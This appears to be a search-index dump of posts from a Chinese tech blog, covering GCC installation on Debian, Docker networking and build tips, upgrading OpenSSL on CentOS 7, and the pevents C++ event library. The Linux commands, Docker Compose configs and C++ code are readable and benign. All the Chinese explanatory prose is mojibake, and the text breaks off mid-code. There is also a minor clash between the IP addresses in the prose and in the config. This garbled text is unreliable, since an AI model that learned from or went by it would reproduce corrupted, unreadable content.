æ‰€æœ‰è¯­è¨€ç‰¹æ€§çš„ç¼–è¯‘å™¨ã€‚ Debian 8 Jessie æ›´æ”¹ä»“åº“æº 123456# å¤‡ä»½é…ç½®æ–‡ä»¶# cp /etc/apt/sources.list /etc/apt/sources.list.bak# æ›´æ”¹ä»“åº“æº# echo "deb http://ftp.us.debian.org/debian/ jessie main contrib non-free" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://ftp.us.debian.org/debian/ jessie main contrib non-free" &gt;&gt; /etc/apt/sources.list å®‰è£… GCCã€G++ã€GDB 123456# å®‰è£…è½¯ä»¶ï¼ˆæœ€åå¾—åˆ°çš„ç‰ˆæœ¬æ˜¯4.8.4ï¼‰# apt-get install -y gcc-4.8 g++-4.8 gdb# å»ºç«‹è½¯é“¾æ¥ï¼ˆå¯é€‰ï¼‰# ln -s /usr/bin/gcc-4.8 /usr/bin/gcc# ln -s /usr/bin/g++-4.8 /usr/bin/g++ Debian 9 Stretchæç¤º build-essential æŒ‡çš„æ˜¯ç¼–è¯‘ç¨‹åºå¿…éœ€çš„è½¯ä»¶åŒ…ï¼ŒåŒ…å«äº† GCCã€G++ã€Make ç­‰å·¥å…· åœ¨ Debian 9 Stretch ä¸Šå®‰è£… build-essential åï¼Œå¾—åˆ°çš„ GCCã€G++ çš„ç‰ˆæœ¬æ˜¯ 6.3.0 è‹¥å¸Œæœ›åœ¨ Debian 9 Stretch ä¸Šå®‰è£…ä½ç‰ˆæœ¬çš„ GCC/G++ï¼ˆä¾‹å¦‚ 4.8ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥å°†ä¸Šé¢ Debian 8 Jessie çš„ä»“åº“æºåœ°å€æ·»åŠ åˆ° Debian 9 Stretch ç³»ç»Ÿé‡Œï¼Œç„¶åä½¿ç”¨åŒæ ·çš„æ–¹æ³•åˆ†åˆ«å•ç‹¬å®‰è£… GCC/G++ æ›´æ”¹ä»“åº“æº 123456789101112# å¤‡ä»½é…ç½®æ–‡ä»¶# cp /etc/apt/sources.list /etc/apt/sources.list.bak# æ›´æ”¹ä»“åº“æº# echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list# echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.list å®‰è£… GCCã€G++ã€GDB 1# apt-get install -y build-essential gdb å‚è€ƒåšå®¢ Debian 9 å®‰è£… gcc-4.8 å¦‚ä½•åœ¨ Debian Stretch ä¸Šå®‰è£… gcc-4.8 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"debian"},{title:"Docker å¼€å‘éšç¬”",url:"/posts/abd1f0ff.html",text:'Docker åˆ é™¤æ‰€æœ‰ none é•œåƒ1# docker rmi `docker images | grep \'&lt;none&gt;\' | awk \'{print $3}\'` Docker æ„å»ºé•œåƒæ—¶å¿½ç•¥é”™è¯¯ä¿¡æ¯æ ¹æ® Dockerfile æ„å»ºé•œåƒï¼Œå½“æ„å»ºå¤±è´¥æ—¶ï¼Œå¾€å¾€ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼š 12automake: error: no \'Makefile.am\' found for any configure outputError build: The command [/bin/sh -c aclocal &amp;&amp; autoconf &amp;&amp; automake -a] returned a non-zero code: 1 åœ¨å¾ˆå¤šä¼ä¸šçš„åº”ç”¨åœºæ™¯é‡Œï¼Œä¸Šé¢çš„é”™è¯¯ä¿¡æ¯å®é™…ä¸Šæ˜¯æ— å®³çš„ï¼Œå¯ä»¥å¿½ç•¥ä¸å¤„ç†ã€‚ä½†ä¸€æ—¦å‡ºç°æ­¤ç±»é”™è¯¯ Docker å°±ä¼šåœæ­¢æ„å»ºï¼Œæ­¤æ—¶å¦‚æœéœ€è¦è®© Docker å¿½ç•¥ç±»ä¼¼çš„é”™è¯¯ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ exit 0 1RUN make å½“ Dockerfile é‡ŒåŒ…å«äº†ä¸Šé¢ç±»ä¼¼çš„æŒ‡ä»¤ï¼Œåˆ™å¯ä»¥æ”¹å†™ä¸ºä»¥ä¸‹çš„å†…å®¹ï¼Œè¿™å°†å§‹ç»ˆè¿”å› 0ï¼ˆæˆåŠŸï¼‰é€€å‡ºä»£ç ï¼Œæ­¤æ—¶ Docker ä¸ä¼šæ„å¤–ç»ˆæ­¢æ„å»ºè¿‡ç¨‹ 1RUN make; exit 0 ä¸åŒç½‘æ®µä¹‹é—´çš„å®¹å™¨å®ç°äº’ç›¸é€šä¿¡Docker å‘½ä»¤è¡Œçš„ä½¿ç”¨æç¤º å‡è®¾å­˜åœ¨ä¸¤ä¸ªå®¹å™¨ï¼Œåˆ†åˆ«æ˜¯ Redis å®¹å™¨ï¼ˆ172.89.0.2ï¼‰å’Œ Nginx å®¹å™¨ï¼ˆ172.89.0.5ï¼‰ï¼Œä¸¤è€…å…·ä½“çš„ docker-compose.yml é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š Redis å®¹å™¨ 123456789101112131415161718192021222324252627version: \'3.5\'services: redis: image: redis:5.0.4-stretch container_name: redis restart: always privileged: false environment: TZ: \'Asia/Shanghai\' ports: - 6379:6379 networks: redis-network: ipv4_address: 172.89.0.2 volumes: - \'/usr/local/redis/data:/data\' - \'/usr/local/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server /usr/local/etc/redis/redis.confnetworks: redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 Nginx å®¹å™¨ 1234567891011121314151617181920212223242526version: \'3.5\'services: nginx: image: nginx:1.20 container_name: nginx restart: always privileged: false environment: TZ: \'Asia/Shanghai\' networks: nginx-network: ipv4_address: 172.64.0.5 ports: - 80:80 - 443:443 volumes: - \'/usr/local/nginx/conf/nginx.conf:/usr/local/nginx/conf/nginx.conf\'networks: nginx-network: name: nginx-network driver: bridge ipam: config: - subnet: 172.64.0.0/24 ä¸Šè¿°çš„ Redis å’Œ Nginx å®¹å™¨åˆ†åˆ«å¤„äºä¸åŒçš„ç½‘æ®µä¸­ï¼Œä¸¤è€…ä¹‹é—´çš„ç½‘ç»œæ— æ³•ç›´æ¥ Ping å¾—é€šï¼›è‹¥å¸Œæœ›åœ¨ Redis å†…å¯ä»¥ Ping é€š Nginx å®¹å™¨ï¼Œé‚£ä¹ˆå¯ä»¥å°† Nginx å®¹å™¨æ·»åŠ åˆ° Redis å®¹å™¨æ‰€åœ¨ç½‘ç»œé‡Œï¼Œå‘½ä»¤ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678# å°†Nginxå®¹å™¨æ·»åŠ åˆ°Rediså®¹å™¨æ‰€åœ¨ç½‘ç»œé‡Œ# docker network connect redis-network nginx# æŸ¥çœ‹Nginxå®¹å™¨åœ¨Rediså®¹å™¨æ‰€åœ¨ç½‘ç»œé‡Œçš„IP# docker network inspect redis-network# åœ¨Rediså®¹å™¨å†…ç›´æ¥Pingé€šNginxå®¹å™¨ï¼ˆè¿™é‡Œçš„IPæ˜¯Nginxå®¹å™¨åœ¨æ–°ç½‘ç»œé‡Œçš„IPåœ°å€ï¼‰# ping 172.89.0.3 è­¦å‘Š ä½¿ç”¨ docker network connect redis-network nginx å‘½ä»¤ï¼Œå°† Nginx å®¹å™¨æ·»åŠ åˆ° Redis å®¹å™¨æ‰€åœ¨ç½‘ç»œåï¼ŒNginx åœ¨æ–°ç½‘ç»œé‡Œçš„ IP åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œä¾‹å¦‚ Docker æœåŠ¡é‡å¯å IP åœ°å€ä¼šå˜æ›´ï¼Œè¿™ä¸€ç‚¹å¿…é¡»æ³¨æ„ï¼ å°† Nginx å®¹å™¨ä» Redis å®¹å™¨æ‰€åœ¨ç½‘ç»œé‡Œç§»é™¤æ‰ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1# docker network disconnect redis-network nginx æç¤º Docker é»˜è®¤ç½‘ç»œçš„åç§°æ˜¯ bridgeï¼Œé»˜è®¤æƒ…å†µä¸‹åˆ›å»ºçš„æ‰€æœ‰å®¹å™¨éƒ½ä¼šåœ¨ bridge ç½‘ç»œå†…ã€‚ 12345# æŸ¥çœ‹Dockerçš„æ‰€æœ‰ç½‘ç»œ# docker network ls# æŸ¥çœ‹æŸç½‘ç»œä¸‹æ‰€æœ‰å®¹å™¨çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬å„ä¸ªå®¹å™¨çš„IPï¼‰# docker network inspect redis-network Docker-Compose çš„ä½¿ç”¨åœ¨ Docker-Compose ä¸­ï¼Œæ”¯æŒå°† Nginx å®¹å™¨æ·»åŠ åˆ° Redis å®¹å™¨æ‰€åœ¨ç½‘ç»œé‡Œï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹æ‰€ç¤ºã€‚ æç¤º å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œé€šè¿‡ docker-compose.yml é…ç½®æ–‡ä»¶ï¼Œå°† Nginx å®¹å™¨æ·»åŠ åˆ° Redis å®¹å™¨æ‰€åœ¨ç½‘ç»œåï¼ŒNginx åœ¨æ–°ç½‘ç»œé‡Œçš„ IP åœ°å€æ˜¯å›ºå®šçš„ã€‚ Redis å®¹å™¨ï¼Œé…ç½®å†…å®¹å’Œä¸Šé¢çš„æ¡ˆä¾‹ä¸€è‡´ 123456789101112131415161718192021222324252627version: \'3.5\'services: redis: image: redis:5.0.4-stretch container_name: redis restart: always privileged: false environment: TZ: \'Asia/Shanghai\' ports: - 6379:6379 networks: redis-network: ipv4_address: 172.89.0.2 volumes: - \'/usr/local/redis/data:/data\' - \'/usr/local/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server /usr/local/etc/redis/redis.confnetworks: redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 Nginx å®¹å™¨ï¼Œé…ç½®äº†å¤šä¸ªç½‘ç»œï¼ŒåŒæ—¶æŒ‡å®šäº†å®¹å™¨åœ¨ä¸åŒç½‘ç»œä¸‹çš„ IP åœ°å€ 12345678910111213141516171819202122232425262728293031323334version: \'3.5\'services: nginx: image: nginx:1.20 container_name: nginx restart: always privileged: false environment: TZ: \'Asia/Shanghai\' networks: nginx-network: ipv4_address: 172.64.0.5 redis-network: ipv4_address: 172.89.0.3 ports: - 80:80 - 443:443 volumes: - \'/usr/local/nginx/conf/nginx.conf:/usr/local/nginx/conf/nginx.conf\'networks: nginx-network: name: nginx-network driver: bridge ipam: config: - subnet: 172.64.0.0/24 redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 æŸ¥çœ‹ Docker çš„ç½‘ç»œçŠ¶å†µ 12345# æŸ¥çœ‹Nginxå®¹å™¨åœ¨Rediså®¹å™¨æ‰€åœ¨ç½‘ç»œé‡Œçš„IP# docker network inspect redis-network# åœ¨Rediså®¹å™¨å†…ç›´æ¥Pingé€šNginxå®¹å™¨# ping 172.89.0.3 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ– å¼€å‘éšç¬”"},{title:"Centos7 å‡çº§ OpenSSL",url:"/posts/4ffdb5e1.html",text:'ç³»ç»Ÿç¯å¢ƒ1Linux clay 3.10.0-1160.49.1.el7.x86_64 #1 SMP Tue Nov 30 15:51:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux å‡çº§ OpenSSL æŸ¥çœ‹ OpenSSL çš„ç‰ˆæœ¬ 12# openssl versionOpenSSL 1.0.2k-fips 26 Jan 2017 å¤‡ä»½æ—§ç‰ˆçš„ OpenSSL 12# mv /usr/bin/openssl /usr/bin/openssl.bak# mv /usr/include/openssl /usr/include/openssl-bak å®‰è£…ä¾èµ– 1# yum install -y perl perl-devel perl-Test-Simple gcc gcc-c++ make ç¼–è¯‘å®‰è£… æ³¨æ„äº‹é¡¹ å»ºè®®ä» OpenSSL å®˜ç½‘ ä¸‹è½½æºç åŒ…ï¼Œæœ€æ–°çš„ç¨³å®šç‰ˆæœ¬æ˜¯ 1.1.1 ç³»åˆ— ./config å‘½ä»¤å¿…é¡»åŠ ä¸Š shared å‚æ•°ï¼Œå¦åˆ™ç”Ÿæˆçš„ lib ç›®å½•é‡Œé¢åªæœ‰ .a é™æ€åº“æ–‡ä»¶ï¼Œ æ²¡æœ‰ .so åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ 123456789101112131415161718192021222324252627# ä¸‹è½½æ–‡ä»¶# wget https://www.openssl.org/source/openssl-1.1.1m.tar.gz# è§£å‹æ–‡ä»¶# tar -xvf openssl-1.1.1m.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd openssl-1.1.1m# æ„å»ºé…ç½®# ./config shared zlib --prefix=/usr/local/openssl# ç¼–è¯‘# make -j4# å®‰è£…# make install# æ·»åŠ åŠ¨æ€é“¾æ¥åº“çš„è·¯å¾„åˆ°ç³»ç»Ÿé…ç½®æ–‡ä»¶# echo "/usr/local/openssl/lib" &gt;&gt; /etc/ld.so.conf# ä½¿é…ç½®ç”Ÿæ•ˆ# ldconfig -v# é“¾æ¥æ–‡ä»¶# ln -sf /usr/local/openssl/bin/openssl /usr/bin/openssl# ln -sf /usr/local/openssl/include/openssl /usr/include/openssl éªŒè¯æ˜¯å¦å‡çº§æˆåŠŸ 12# openssl versionOpenSSL 1.1.1m 14 Dec 2021 å‡çº§åçš„ç»´æŠ¤æ›´æ–° OpenSSL åï¼Œéœ€è¦æ’æŸ¥ç³»ç»Ÿçš„ç¬¬ä¸‰æ–¹æœåŠ¡æ˜¯å¦ä»¥é™æ€ç¼–è¯‘æ–¹å¼ä½¿ç”¨äº† OpenSSLï¼›å¦‚æœç¬¬ä¸‰æ–¹æœåŠ¡æ˜¯é™æ€ç¼–è¯‘çš„ï¼Œåˆ™éœ€è¦æŒ‡å®šæ–°çš„ OpenSSL åº“é‡æ–°è¿›è¡Œç¼–è¯‘ï¼Œå¦åˆ™ä¼šå½±å“æœåŠ¡çš„æ­£å¸¸è¿è¡Œæˆ–è€…å®¹æ˜“è®©å…¶å—åˆ°å®‰å…¨æ”»å‡»ã€‚ æç¤º ä¸€èˆ¬ä»¥é™æ€ç¼–è¯‘æ–¹å¼ä½¿ç”¨äº† OpenSSL çš„ç¬¬ä¸‰æ–¹æœåŠ¡æœ‰ï¼šOpenSSHã€Nginxã€Apacheï¼Œå°¤å…¶å½“ Web æœåŠ¡å™¨æ”¯æŒ HTTPS åè®®çš„æ—¶å€™ å‚è€ƒåšå®¢ Ubuntu16.04.4 å‡çº§ OpenSSL Centos8 OpenSSL å‡çº§ç‰ˆæœ¬åˆ°æœ€æ–° CentOS å¦‚ä½•å‡çº§ OpenSSL åˆ°æœ€æ–°ç‰ˆæœ¬ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Linux å®ç° Windows çš„ Event äº‹ä»¶æœºåˆ¶",url:"/posts/c847598e.html",text:'å‰è¨€ Linux ä¸­æ²¡æœ‰ Windows ç³»ç»Ÿä¸­çš„ CreateEvent()ã€WaitEvent()ã€SetEvent()ã€ResetEvent() ç­‰å‡½æ•°ï¼Œæœ¬æ–‡å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨ pevents æ›¿ä»£ Linux ç¼ºå¤±çš„å‡½æ•°ã€‚ pevents ä»‹ç» pevents çš„ç®€ä»‹pevents æ˜¯ä¸€ä¸ªè·¨å¹³å°çš„è½»é‡çº§ C++ åº“ï¼Œæ—¨åœ¨ä¸º POSIX ç³»ç»Ÿæä¾› WIN32 äº‹ä»¶çš„å®ç°ã€‚pevents æä¾›äº† Windows å¹³å°æ‰‹åŠ¨å’Œè‡ªåŠ¨é‡ç½®äº‹ä»¶çš„å¤§éƒ¨åˆ†åŠŸèƒ½ï¼Œæœ€æ˜¾è‘—çš„æ˜¯æ”¯æŒåŒæ—¶ç­‰å¾…å¤šä¸ªäº‹ä»¶ï¼ˆWaitForMultipleObjectsï¼‰ï¼Œè€Œä¸”æ”¯æŒ Windowsã€FreeBSDã€Linuxã€macOSã€iOSã€Android ç­‰å¹³å°ã€‚ pevents çš„ APIAPI å‡½æ•°pevents çš„ API æ˜¯æ ¹æ® Windows çš„ CreateEventï¼ˆï¼‰ã€WaitEventï¼ˆï¼‰ å’Œ WaitForMultipleObjectsï¼ˆï¼‰ å‡½æ•°ç¼–å†™çš„ï¼Œç†Ÿæ‚‰ WIN32 äº‹ä»¶çš„å¼€å‘äººå‘˜åº”è¯¥å¯ä»¥å°†ä»£ç åº“åˆ‡æ¢åˆ° pevents APIã€‚è™šå‡å”¤é†’æ˜¯ Linux ä¸‹ç³»ç»Ÿç¼–ç¨‹çš„æ­£å¸¸éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯æ¥è‡ª Windows ä¸–ç•Œçš„å¼€å‘äººå‘˜çš„å¸¸è§é™·é˜±ï¼Œpevents å¯ä»¥ä¿è¯ä¸å­˜åœ¨è™šå‡å”¤é†’å’Œç­‰å¾…è¿”å›çš„æ•°æ®çš„æ­£ç¡®æ€§ï¼Œå…¶æä¾›äº†å¦‚ä¸‹çš„ APIï¼š 12345678910int SetEvent(neosmart_event_t event);int ResetEvent(neosmart_event_t event);int PulseEvent(neosmart_event_t event);int DestroyEvent(neosmart_event_t event);neosmart_event_t CreateEvent(bool manualReset, bool initialState);int WaitForEvent(neosmart_event_t event, uint64_t milliseconds);int WaitForMultipleEvents(neosmart_event_t *events, int count, bool waitAll, uint64_t milliseconds);int WaitForMultipleEvents(neosmart_event_t *events, int count, bool waitAll, uint64_t milliseconds, int &amp;index); äº‹ä»¶çŠ¶æ€çš„ç±»å‹ CreateEvent() å‡½æ•° 1234567neosmart_event_t CreateEvent( // trueï¼šè¡¨ç¤ºæ‰‹åŠ¨ï¼Œåœ¨ WaitEvent åéœ€è¦æ‰‹åŠ¨è°ƒç”¨ ResetEvent æ¸…é™¤äº‹ä»¶ä¿¡å·ã€‚falseï¼šè¡¨ç¤ºè‡ªåŠ¨ï¼Œåœ¨ WaitEvent åï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æ¸…é™¤äº‹ä»¶ä¿¡å· bool manualReset, // åˆå§‹çŠ¶æ€ï¼Œfalse ä¸ºæ— ä¿¡å·ï¼Œtrue ä¸ºæœ‰ä¿¡å· bool initialState); WaitForEvent() å‡½æ•° 123456int WaitForEvent( // å¥æŸ„å¯¹è±¡ neosmart_event_t event, // ç­‰å¾…çš„æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ uint64_t milliseconds); äº‹ä»¶çŠ¶æ€çš„ç±»å‹ WAIT_TIMEOUTï¼šç­‰å¾…è¶…æ—¶ WAIT_OBJECT_0ï¼šå¥æŸ„å¯¹è±¡å¤„äºæœ‰ä¿¡å·çŠ¶æ€ WAIT_FAILEDï¼šå‡ºç°é”™è¯¯ï¼Œå¯é€šè¿‡ GetLastError() å‡½æ•°å¾—åˆ°é”™è¯¯ç  WAIT_ABANDONEDï¼šè¯´æ˜å¥æŸ„ä»£è¡¨çš„å¯¹è±¡æ˜¯ä¸ªäº’æ–¥å¯¹è±¡ï¼Œå¹¶ä¸”æ­£åœ¨è¢«å…¶å®ƒçº¿ç¨‹å ç”¨ æ³¨æ„ åœ¨ Linux å¹³å°ï¼Œpevents çš„äº‹ä»¶çŠ¶æ€åªæ”¯æŒä½¿ç”¨ WAIT_TIMEOUTï¼Œä¸”æœ‰ä¿¡å·çš„æ—¶å€™ WaitEvent() å‡½æ•°çš„è¿”å›å€¼æ˜¯ 0ï¼Œè€Œåœ¨ Windows å¹³å°åˆ™æ”¯æŒä¸Šè¿°å››ç§äº‹ä»¶çŠ¶æ€ pevents çš„é¡¹ç›®ç»“æ„ æ ¸å¿ƒä»£ç åœ¨ src/ ç›®å½• å•å…ƒæµ‹è¯•ä»£ç ï¼ˆé€šè¿‡ Meson æ„å»ºï¼‰åœ¨ test/ ç›®å½• åœ¨ examples/ ç›®å½•ä¸­å¯ä»¥æ‰¾åˆ°æ¼”ç¤º pevents ç”¨æ³•çš„è·¨å¹³å°åº”ç”¨ç¤ºä¾‹ç¨‹åº pevents çš„ç¼–è¯‘æ„å»ºpevents ä½¿ç”¨çš„æ„å»ºå·¥å…·æ˜¯ Mesonï¼Œç›®å‰è¿™ä»…ç”¨äºæ”¯æŒ pevents æ ¸å¿ƒä»£ç åŠå…¶å•å…ƒæµ‹è¯•çš„è‡ªåŠ¨åŒ–æ„å»º / æµ‹è¯•ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¼€å‘äººå‘˜ä¸éœ€è¦æ‹…å¿ƒæ„å»ºå·¥å…·çš„å·®å¼‚æ€§ï¼Œpevents æ˜¯ç‰¹æ„åŸºäº C/C++ æ ‡å‡†ç¼–å†™çš„ï¼Œé¿å…äº†å¤æ‚çš„é…ç½®æˆ–ä¾èµ–äºå¹³å°çš„æ„å»ºæŒ‡ä»¤çš„éœ€è¦ã€‚ pevents çš„ç¼–è¯‘å‚æ•°é€šè¿‡ç¼–è¯‘å‚æ•° -DWFMO ä¸ -DPULSEï¼Œå¯ä»¥åœ¨ç¼–è¯‘æ—¶è®© pevents å¯ç”¨ä¸åŒçš„åŠŸèƒ½ï¼š WFMOï¼šå¯ç”¨ WFMO åŠŸèƒ½ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨ WaitForMultipleEvents() å‡½æ•°ï¼Œå»ºè®®ä»…ä½¿ç”¨ WFMO è¿›è¡Œç¼–è¯‘ï¼Œå› ä¸ºå®ƒä¼šä¸ºæ‰€æœ‰äº‹ä»¶å¯¹è±¡å¢åŠ å¼€é”€ï¼ˆè¾ƒå°ï¼‰ã€‚ PULSEï¼šå¯ç”¨ PulseEvent åŠŸèƒ½ï¼ŒPulseEvent() åœ¨ Windows å¹³å°ä»æ ¹æœ¬ä¸Šè¢«ç ´åäº†ï¼Œä¸€èˆ¬ä¸åº”è¯¥è¢«ä½¿ç”¨ï¼Œå½“ä½ è°ƒç”¨å®ƒæ—¶ï¼Œå®ƒå‡ ä¹æ°¸è¿œä¸ä¼šåšä½ è®¤ä¸ºä½ æ­£åœ¨åšçš„äº‹æƒ…ã€‚pevents åŒ…å«è¿™ä¸ªå‡½æ•°åªæ˜¯ä¸ºäº†è®©ç°æœ‰çš„ï¼ˆæœ‰ç¼ºé™·çš„ï¼‰ä»£ç ä» WIN32 ç§»æ¤åˆ° Unix/Linux å¹³å°æ›´å®¹æ˜“ï¼Œå¹¶ä¸”è¿™ä¸ªå‡½æ•°é»˜è®¤æ²¡æœ‰ç¼–è¯‘åˆ° pevents ä¸­ã€‚ Meson æŒ‡å®šç¼–è¯‘å‚æ•°åœ¨ Meson ä¸­ï¼Œå¯ä»¥é€šè¿‡ meson_options.txt é…ç½®æ–‡ä»¶æŒ‡å®šç¼–è¯‘å‚æ•°ï¼Œè®© pevents å¯ç”¨ä¸åŒçš„åŠŸèƒ½ 1234option(\'wfmo\', type: \'boolean\', value: true, description: \'Enable WFMO events\')option(\'pulse\', type: \'boolean\', value: false, description: \'Enable PulseEvent() function\') CMake æŒ‡å®šç¼–è¯‘å‚æ•°åœ¨ CMake ä¸­ï¼Œå¯ä»¥é€šè¿‡ CMakeLists.txt é…ç½®æ–‡ä»¶æŒ‡å®šç¼–è¯‘å‚æ•°ï¼Œè®© pevents å¯ç”¨ä¸åŒçš„åŠŸèƒ½ 1set(CMAKE_CXX_FLAGS "-std=c++11 -lpthread -DWFMO") pevents è¿è¡Œç¤ºä¾‹ä»£ç æç¤º å€¼å¾—ä¸€æçš„æ˜¯ï¼Œpevents çš„æ ¸å¿ƒ C++ æºæ–‡ä»¶æ˜¯ pevents.hã€pevents.cpp 1234567891011121314151617# æ‹‰å–ä»£ç $ git clone git@github.com:clay-world/pevents.git# è¿›å…¥æºç ç›®å½•$ cd pevents# ç”Ÿæˆæ„å»ºçš„è¾“å‡ºç›®å½•$ meson build# è¿›å…¥æ„å»ºçš„è¾“å‡ºç›®å½•$ cd build# ç¼–è¯‘ä»£ç $ ninja# è¿è¡Œç¤ºä¾‹ç¨‹åº$ ./sample pevents çš„å®æˆ˜æ¡ˆä¾‹ç¼–è¯‘è¯´æ˜ä¸‹é¢ç»™å‡ºçš„æ¡ˆä¾‹ä½¿ç”¨äº† pthreadï¼Œç”±äº pthread ä¸æ˜¯ Linux ç³»ç»Ÿé»˜è®¤çš„åº“ï¼Œå› æ­¤é“¾æ¥æ—¶éœ€è¦ä½¿ç”¨é™æ€åº“ libpthread.aã€‚ç®€è€Œè¨€ä¹‹ï¼Œåœ¨ä½¿ç”¨ pthread_create() åˆ›å»ºçº¿ç¨‹ï¼Œä»¥åŠè°ƒç”¨ pthread_atfork() å‡½æ•°å»ºç«‹ fork å¤„ç†ç¨‹åºæ—¶ï¼Œéœ€è¦é€šè¿‡ -lpthread å‚æ•°é“¾æ¥è¯¥åº“ï¼ŒåŒæ—¶è¿˜éœ€è¦åœ¨ C++ æºæ–‡ä»¶é‡Œæ·»åŠ å¤´æ–‡ä»¶ pthread.hã€‚ æç¤º ä¸ºäº†å¯ä»¥æ­£å¸¸ç¼–è¯‘ä½¿ç”¨äº† pthread çš„é¡¹ç›®ä»£ç ï¼Œä¸åŒæ„å»ºå·¥å…·çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š è‹¥ä½¿ç”¨ G++ ç¼–è¯‘ C++ é¡¹ç›®ï¼Œåˆ™ç¼–è¯‘å‘½ä»¤çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š 12# ç¼–è¯‘ä»£ç $ g++ main.cpp -o main -lpthread è‹¥ä½¿ç”¨ CMake æ„å»º C++ é¡¹ç›®ï¼Œåˆ™ CMakeLists.txt é…ç½®æ–‡ä»¶çš„ç¤ºä¾‹å†…å®¹å¦‚ä¸‹ï¼š 123set(CMAKE_CXX_FLAGS "-std=c++11 -lpthread -DWFMO")add_executable(main main.cpp) å®æˆ˜æ¡ˆä¾‹ä¸€CreateEvent(true, true) - æ‰‹åŠ¨æ¸…é™¤äº‹ä»¶ä¿¡å·ï¼Œåˆå§‹çŠ¶æ€ä¸ºæœ‰ä¿¡å·ï¼Œç‚¹å‡»ä¸‹è½½ åŸºäº CMake æ„å»ºçš„å®Œæ•´æ¡ˆä¾‹ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include "pevents.h"using namespace std;using namespace neosmart;neosmart_event_t g_hEvent = NULL;void printIds(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *procFunc1(void *args) { printIds("thread-1"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-1 is working..." &lt;&lt; endl; } return ((void *) 0);}void *procFunc2(void *args) { printIds("thread-2"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-2 is working..." &lt;&lt; endl; } return ((void *) 0);}int main() { // 